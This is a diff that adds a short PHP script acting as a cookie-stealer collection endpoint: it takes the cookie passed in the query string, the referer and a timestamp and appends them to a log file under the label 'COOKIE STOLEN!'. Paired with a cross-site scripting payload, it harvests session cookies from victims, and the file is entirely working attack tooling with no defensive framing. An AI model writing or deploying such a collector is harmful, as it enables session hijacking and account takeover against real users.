@@ -1,0 +1,13 @@
+<?php
+function logData()
+{
+$ipLog="log.txt";
+$cookie = $_SERVER['QUERY_STRING'];
+$referer = $_SERVER['HTTP_REFERER'];
+$date=date ("l dS of F Y h:i:s A");
+$log=fopen("$ipLog", "a+");
+fputs($log, "COOKIE STOLEN! REF: $referer| DATE: $date | COOKIE: $cookie \n");
+fclose($log);
+}
+logData();
+?>
